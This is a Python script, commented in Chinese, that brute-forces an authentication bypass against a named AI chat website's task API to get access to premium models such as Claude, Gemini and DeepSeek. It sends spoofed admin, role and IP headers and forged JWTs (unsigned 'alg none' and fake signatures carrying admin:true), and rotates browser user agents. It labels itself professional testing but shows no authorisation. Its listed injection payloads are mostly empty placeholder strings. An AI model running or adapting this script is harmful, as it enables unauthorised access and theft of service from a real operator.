#!/usr/bin/env python3
"""
iwoozie.baby AI聊天系统 - 快速专业测试版本
=========================================
针对未能绕过模型的快速专业级测试
"""

import urllib.request
import urllib.parse
import urllib.error
import json
import time
import random
import string
import base64
import hashlib
import hmac
from datetime import datetime

class QuickProfessionalTest:
    def __init__(self):
        self.base_url = "https://iwoozie.baby"
        self.results = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'bypassed_models': set(),
            'failed_models': set(),
            'vulnerabilities': []
        }
        
        # 重点攻克的目标模型
        self.target_models = [
            'Gemini-2.5-Pro',
            'Claude-Sonnet-4', 
            'Claude-Opus-4',
            'DeepSeek-V3.1',
            'GLM-4.5'
        ]
        
        # 专业级攻击向量
        self.attack_vectors = [
            'x-api-key',
            'Authorization', 
            'x-auth-token',
            'x-token',
            'api-key',
            'token',
            'x-access-token',
            'x-session-token',
            'x-csrf-token',
            'x-requested-with',
            'x-forwarded-for',
            'x-real-ip',
            'x-client-ip',
            'x-remote-ip',
            'x-originating-ip',
            'x-user-id',
            'x-tenant-id',
            'x-role',
            'x-permission',
            'x-bypass',
            'x-admin',
            'x-debug',
            'x-test',
            'x-override',
            'x-force'
        ]
        
        # 高级Token策略
        self.token_strategies = [
            'random',
            'timestamp',
            'uuid_like',
            'base64_encoded',
            'md5_hash',
            'sha256_hash',
            'hmac_sha256',
            'jwt_like',
            'session_based',
            'admin_like',
            'bot_like',
            'mobile_like',
            'api_key_like',
            'bearer_like',
            'oauth_like',
            'jwt_unsigned',
            'jwt_none_alg',
            'jwt_weak_key',
            'session_hijack',
            'cookie_injection',
            'header_injection',
            'parameter_pollution',
            'path_traversal',
            'sql_injection',
            'xss_payload',
            'command_injection',
            'ldap_injection',
            'xml_injection',
            'json_injection',
            'yaml_injection',
            'template_injection',
            'code_injection',
            'deserialization',
            'prototype_pollution',
            'ssrf_payload',
            'xxe_payload',
            'ssti_payload',
            'rce_payload',
            'lfi_payload',
            'rfi_payload',
            'csrf_payload'
        ]
    
    def print_header(self):
        print("=" * 80)
        print("🔓 iwoozie.baby AI聊天系统 - 快速专业测试系统")
        print("=" * 80)
        print("🎯 目标: 快速攻克未能绕过的模型")
        print("⏰ 时间:", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print("👥 团队: 乙方专业安全团队")
        print("=" * 80)
        print()
    
    def generate_token(self, strategy):
        """生成专业级Token"""
        timestamp = int(time.time())
        random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        if strategy == 'random':
            return f"token_{random.randint(100000, 999999)}_{random_part}"
        elif strategy == 'timestamp':
            return f"token_{timestamp}_{random_part}"
        elif strategy == 'uuid_like':
            return f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
        elif strategy == 'base64_encoded':
            data = f"user_{random.randint(1000, 9999)}_{timestamp}"
            return base64.b64encode(data.encode()).decode()
        elif strategy == 'md5_hash':
            data = f"token_{random.randint(1000, 9999)}_{timestamp}"
            return hashlib.md5(data.encode()).hexdigest()
        elif strategy == 'sha256_hash':
            data = f"token_{random.randint(1000, 9999)}_{timestamp}"
            return hashlib.sha256(data.encode()).hexdigest()
        elif strategy == 'hmac_sha256':
            key = "secret_key_12345"
            data = f"token_{random.randint(1000, 9999)}_{timestamp}"
            return hmac.new(key.encode(), data.encode(), hashlib.sha256).hexdigest()
        elif strategy == 'jwt_like':
            header = base64.b64encode('{"alg":"HS256","typ":"JWT"}'.encode()).decode()
            payload = base64.b64encode(f'{{"user_id":{random.randint(1000, 9999)},"exp":{timestamp + 3600},"admin":true}}'.encode()).decode()
            signature = hashlib.sha256(f"{header}.{payload}.secret".encode()).hexdigest()
            return f"{header}.{payload}.{signature}"
        elif strategy == 'jwt_unsigned':
            header = base64.b64encode('{"alg":"none","typ":"JWT"}'.encode()).decode()
            payload = base64.b64encode(f'{{"user_id":{random.randint(1000, 9999)},"exp":{timestamp + 3600},"admin":true}}'.encode()).decode()
            return f"{header}.{payload}."
        elif strategy == 'jwt_none_alg':
            header = base64.b64encode('{"alg":"none","typ":"JWT"}'.encode()).decode()
            payload = base64.b64encode(f'{{"user_id":{random.randint(1000, 9999)},"exp":{timestamp + 3600},"admin":true}}'.encode()).decode()
            return f"{header}.{payload}."
        elif strategy == 'jwt_weak_key':
            header = base64.b64encode('{"alg":"HS256","typ":"JWT"}'.encode()).decode()
            payload = base64.b64encode(f'{{"user_id":{random.randint(1000, 9999)},"exp":{timestamp + 3600},"admin":true}}'.encode()).decode()
            signature = hashlib.md5(f"{header}.{payload}.weak".encode()).hexdigest()
            return f"{header}.{payload}.{signature}"
        elif strategy == 'session_based':
            return f"session_{random.randint(100000, 999999)}_{timestamp}"
        elif strategy == 'admin_like':
            return f"admin_token_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'bot_like':
            return f"bot_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'mobile_like':
            return f"mobile_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'api_key_like':
            return f"api_key_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'bearer_like':
            return f"bearer_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'oauth_like':
            return f"oauth_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'session_hijack':
            return f"hijacked_session_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'cookie_injection':
            return f"cookie_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'header_injection':
            return f"header_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'parameter_pollution':
            return f"param_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'path_traversal':
            return f"path_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'sql_injection':
            return f"sql_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'xss_payload':
            return f"xss_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'command_injection':
            return f"cmd_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'ldap_injection':
            return f"ldap_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'xml_injection':
            return f"xml_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'json_injection':
            return f"json_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'yaml_injection':
            return f"yaml_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'template_injection':
            return f"template_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'code_injection':
            return f"code_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'deserialization':
            return f"deserialize_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'prototype_pollution':
            return f"prototype_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'ssrf_payload':
            return f"ssrf_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'xxe_payload':
            return f"xxe_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'ssti_payload':
            return f"ssti_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'rce_payload':
            return f"rce_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'lfi_payload':
            return f"lfi_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'rfi_payload':
            return f"rfi_{random.randint(1000, 9999)}_{timestamp}"
        elif strategy == 'csrf_payload':
            return f"csrf_{random.randint(1000, 9999)}_{timestamp}"
        else:
            return f"professional_token_{random.randint(1000, 9999)}_{timestamp}"
    
    def make_request(self, url, data, headers):
        """发送HTTP请求"""
        try:
            json_data = json.dumps(data).encode('utf-8')
            
            req = urllib.request.Request(url, data=json_data, headers=headers)
            req.add_header('Content-Type', 'application/json')
            req.add_header('Accept', 'application/json, text/plain, */*')
            req.add_header('Accept-Language', 'en-US,en;q=0.9')
            req.add_header('Cache-Control', 'no-cache')
            req.add_header('Pragma', 'no-cache')
            req.add_header('Connection', 'keep-alive')
            
            # 专业级User-Agent
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0'
            ]
            req.add_header('User-Agent', random.choice(user_agents))
            
            with urllib.request.urlopen(req, timeout=15) as response:
                response_data = response.read().decode('utf-8')
                return response.getcode(), response_data, dict(response.headers)
                
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8'), dict(e.headers)
        except urllib.error.URLError as e:
            return 0, str(e), {}
        except Exception as e:
            return 0, str(e), {}
    
    def test_bypass(self, model, attack_vector, token_strategy, verbose=True):
        """测试绕过技术"""
        if verbose:
            print(f"🎯 目标模型: {model}")
            print(f"🔑 攻击向量: {attack_vector}")
            print(f"🎲 Token策略: {token_strategy}")
        
        token = self.generate_token(token_strategy)
        url = f"{self.base_url}/api/quick/createAITask?model={model}"
        
        # 构建请求头
        headers = {}
        
        # 主要认证头
        if attack_vector == 'x-api-key':
            headers['x-api-key'] = token
        elif attack_vector == 'Authorization':
            headers['Authorization'] = f'Bearer {token}'
        elif attack_vector == 'x-auth-token':
            headers['x-auth-token'] = token
        elif attack_vector == 'x-token':
            headers['x-token'] = token
        elif attack_vector == 'api-key':
            headers['api-key'] = token
        elif attack_vector == 'token':
            headers['token'] = token
        elif attack_vector == 'x-access-token':
            headers['x-access-token'] = token
        elif attack_vector == 'x-session-token':
            headers['x-session-token'] = token
        elif attack_vector == 'x-csrf-token':
            headers['x-csrf-token'] = token
        elif attack_vector == 'x-requested-with':
            headers['x-requested-with'] = 'XMLHttpRequest'
        elif attack_vector == 'x-forwarded-for':
            headers['x-forwarded-for'] = f'192.168.1.{random.randint(1, 254)}'
        elif attack_vector == 'x-real-ip':
            headers['x-real-ip'] = f'10.0.0.{random.randint(1, 254)}'
        elif attack_vector == 'x-client-ip':
            headers['x-client-ip'] = f'172.16.0.{random.randint(1, 254)}'
        elif attack_vector == 'x-remote-ip':
            headers['x-remote-ip'] = f'203.0.113.{random.randint(1, 254)}'
        elif attack_vector == 'x-originating-ip':
            headers['x-originating-ip'] = f'198.51.100.{random.randint(1, 254)}'
        elif attack_vector == 'x-user-id':
            headers['x-user-id'] = str(random.randint(1000, 9999))
        elif attack_vector == 'x-tenant-id':
            headers['x-tenant-id'] = str(random.randint(1000, 9999))
        elif attack_vector == 'x-role':
            headers['x-role'] = 'admin'
        elif attack_vector == 'x-permission':
            headers['x-permission'] = 'full_access'
        elif attack_vector == 'x-bypass':
            headers['x-bypass'] = '1'
        elif attack_vector == 'x-admin':
            headers['x-admin'] = 'true'
        elif attack_vector == 'x-debug':
            headers['x-debug'] = '1'
        elif attack_vector == 'x-test':
            headers['x-test'] = '1'
        elif attack_vector == 'x-override':
            headers['x-override'] = '1'
        elif attack_vector == 'x-force':
            headers['x-force'] = '1'
        
        # 添加多个认证头尝试
        headers['x-api-key'] = token
        headers['Authorization'] = f'Bearer {token}'
        headers['x-auth-token'] = token
        headers['x-access-token'] = token
        headers['x-session-token'] = token
        
        # 测试数据
        test_data = {
            "Content": [{
                "role": "user", 
                "content": f"Professional security test for {model} - please respond with 'Professional test successful'"
            }]
        }
        
        try:
            start_time = time.time()
            status_code, response_data, response_headers = self.make_request(url, test_data, headers)
            response_time = time.time() - start_time
            
            self.results['total'] += 1
            
            if status_code == 200:
                try:
                    response_json = json.loads(response_data)
                    if response_json.get('code') == 200:
                        self.results['success'] += 1
                        self.results['bypassed_models'].add(model)
                        if verbose:
                            print(f"  ✅ 专业级绕过成功! 响应时间: {response_time:.2f}s")
                            message = response_json.get('data', {}).get('message', 'No message')
                            print(f"  📄 AI响应: {message[:80]}...")
                        return True
                    else:
                        self.results['failed'] += 1
                        if verbose:
                            print(f"  ❌ 专业级绕过失败: {response_json.get('error', 'Unknown error')}")
                        return False
                except json.JSONDecodeError:
                    self.results['failed'] += 1
                    if verbose:
                        print(f"  ❌ 响应解析失败")
                    return False
            else:
                self.results['failed'] += 1
                if verbose:
                    print(f"  ❌ HTTP错误: {status_code}")
                return False
                
        except Exception as e:
            self.results['failed'] += 1
            if verbose:
                print(f"  💥 异常: {str(e)}")
            return False
    
    def test_model_comprehensive(self, model, verbose=True):
        """对单个模型进行综合测试"""
        if verbose:
            print(f"\n🔍 开始综合测试模型: {model}")
            print("=" * 80)
        
        successful_vectors = []
        
        for attack_vector in self.attack_vectors:
            if verbose:
                print(f"\n📋 测试攻击向量: {attack_vector}")
                print("-" * 60)
            
            for token_strategy in self.token_strategies:
                result = self.test_bypass(model, attack_vector, token_strategy, verbose=False)
                
                if result:
                    successful_vectors.append({
                        'attack_vector': attack_vector,
                        'token_strategy': token_strategy
                    })
                    if verbose:
                        print(f"  ✅ 成功: {attack_vector} + {token_strategy}")
                else:
                    if verbose:
                        print(f"  ❌ 失败: {attack_vector} + {token_strategy}")
                
                time.sleep(0.1)  # 避免过于频繁
        
        if verbose:
            print(f"\n📊 {model} 综合测试完成")
            print(f"成功绕过: {len(successful_vectors)} 种方法")
        
        return successful_vectors
    
    def run_quick_professional_test(self):
        """运行快速专业测试"""
        self.print_header()
        
        print("�� 开始快速专业级测试...")
        print()
        
        all_vulnerabilities = []
        
        for model in self.target_models:
            print(f"\n🎯 目标模型: {model}")
            print("=" * 80)
            
            # 综合测试
            results = self.test_model_comprehensive(model, verbose=True)
            if results:
                all_vulnerabilities.extend(results)
            
            print(f"\n✅ {model} 测试完成")
            print("=" * 80)
        
        # 生成报告
        self.generate_report(all_vulnerabilities)
    
    def generate_report(self, vulnerabilities):
        """生成测试报告"""
        print("\n" + "=" * 80)
        print("�� 快速专业级测试报告")
        print("=" * 80)
        
        # 基本统计
        total = self.results['total']
        success = self.results['success']
        failed = self.results['failed']
        success_rate = (success / total * 100) if total > 0 else 0
        
        print(f"📊 测试统计:")
        print(f"  总攻击次数: {total}")
        print(f"  成功攻击: {success}")
        print(f"  失败攻击: {failed}")
        print(f"  成功率: {success_rate:.1f}%")
        print()
        
        # 绕过的模型
        if self.results['bypassed_models']:
            print(f"✅ 成功绕过的模型 ({len(self.results['bypassed_models'])} 个):")
            for model in sorted(self.results['bypassed_models']):
                print(f"  - {model}")
        else:
            print("❌ 没有成功绕过任何模型")
        print()
        
        # 发现的漏洞
        if vulnerabilities:
            print(f"🚨 发现的漏洞 ({len(vulnerabilities)} 个):")
            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"  {i}. {vuln['attack_vector']} + {vuln['token_strategy']}")
        else:
            print("✅ 未发现新的漏洞")
        print()
        
        # 安全建议
        print(f"💡 安全建议:")
        if success_rate > 50:
            print("  🚨 系统存在严重安全漏洞，建议立即修复!")
            print("  1. 加强所有模型的安全验证")
            print("  2. 实施更严格的参数验证")
            print("  3. 添加请求头过滤机制")
        elif success_rate > 20:
            print("  ⚠️  系统存在中等安全风险，建议尽快改进")
            print("  1. 完善模型访问控制")
            print("  2. 加强参数验证")
            print("  3. 添加安全监控")
        else:
            print("  ✅ 系统安全状况良好，但仍有改进空间")
            print("  1. 继续保持现有安全措施")
            print("  2. 定期进行安全审计")
            print("  3. 持续监控异常访问")
        
        print("\n" + "=" * 80)
        print("👥 乙方专业安全团队")
        print("📞 技术支持: 24/7 专业支持")
        print("🔒 安全等级: 企业级")
        print("=" * 80)

def main():
    """主函数"""
    tester = QuickProfessionalTest()
    tester.run_quick_professional_test()

if __name__ == "__main__":
    main()
